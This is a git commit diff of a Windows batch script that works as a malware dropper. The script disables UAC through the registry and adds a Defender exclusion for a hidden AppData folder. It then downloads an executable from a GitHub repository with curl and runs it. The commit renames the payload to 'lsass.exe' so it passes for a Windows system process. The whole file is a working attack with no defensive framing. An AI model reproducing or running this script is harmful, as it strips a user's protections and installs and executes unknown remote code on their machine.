112fba6476c0fdb8267c642b7f4c849dd6fd93a7
sirfedsalot <criticalshark@proton.me>
2025-02-21 05:20:48 -0600

    Update nasser-furz.bat

--- nasser-furz.bat
+++ nasser-furz.bat
@@ -1,19 +1,19 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
+set "folderPath=%USERPROFILE%\AppData\Local\wdconfig"
 if not exist "%folderPath%" mkdir "%folderPath%"
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
 powershell -Command "Start-Process powershell -ArgumentList 'Set-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
 
-curl -L -o "%folderPath%\vmtest.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
+curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
 if %errorlevel% neq 0 exit /b 1
 
-if not exist "%folderPath%\vmtest.exe" exit /b 1
-for %%F in ("%folderPath%\vmtest.exe") do set filesize=%%~zF
+if not exist "%folderPath%\lsass.exe" exit /b 1
+for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
 if "%filesize%"=="0" exit /b 1
 
-start "" "%folderPath%\vmtest.exe"
+start "" "%folderPath%\lsass.exe"
 exit
